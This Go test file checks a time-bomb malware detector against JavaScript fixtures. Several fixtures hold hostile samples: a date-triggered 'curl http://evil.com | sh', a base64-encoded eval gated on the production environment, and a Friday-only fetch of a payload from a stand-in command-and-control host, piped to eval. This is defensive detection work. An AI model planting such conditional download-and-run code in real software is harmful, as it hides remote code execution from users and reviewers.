package analyzer

import (
	"strings"
	"testing"
)

func TestTimeBombAnalyzer_DateComparison(t *testing.T) {
	a := NewTimeBombAnalyzer()
	content := `
const now = new Date();
if (now > new Date('2025-06-15')) {
	require('child_process').exec('curl http://evil.com | sh');
}
`
	findings := a.scanContent(content, "index.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "time") || strings.Contains(f.Title, "Time") || strings.Contains(f.Title, "date") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect time-bomb date comparison")
	}
}

func TestTimeBombAnalyzer_SetTimeoutLongDelay(t *testing.T) {
	a := NewTimeBombAnalyzer()
	content := `
setTimeout(() => {
	const cp = require('child_process');
	cp.exec('whoami');
}, 86400000); // 24 hours delay
`
	findings := a.scanContent(content, "delayed.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "delay") || strings.Contains(f.Title, "Delay") || strings.Contains(f.Title, "timer") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect suspiciously long setTimeout delay")
	}
}

func TestTimeBombAnalyzer_EnvConditionalPayload(t *testing.T) {
	a := NewTimeBombAnalyzer()
	content := `
if (process.env.NODE_ENV === 'production') {
	eval(Buffer.from('Y3VybCBodHRwOi8vZXZpbC5jb20=', 'base64').toString());
}
`
	findings := a.scanContent(content, "conditional.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "conditional") || strings.Contains(f.Title, "Conditional") || strings.Contains(f.Title, "environment") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect environment-conditional payload")
	}
}

func TestTimeBombAnalyzer_WeekdayCheck(t *testing.T) {
	a := NewTimeBombAnalyzer()
	content := `
const d = new Date();
if (d.getDay() === 5) { // Friday only
	fetch('https://c2.example.com/payload').then(r => r.text()).then(eval);
}
`
	findings := a.scanContent(content, "weekday.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "time") || strings.Contains(f.Title, "Time") || strings.Contains(f.Title, "date") || strings.Contains(f.Title, "Date") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect weekday-based conditional execution")
	}
}

func TestTimeBombAnalyzer_CleanCode(t *testing.T) {
	a := NewTimeBombAnalyzer()
	content := `
const express = require('express');
const app = express();
app.get('/', (req, res) => {
	res.send('Hello World');
});
app.listen(3000);
`
	findings := a.scanContent(content, "clean.js")
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity in clean code: %s", f.Title)
		}
	}
}
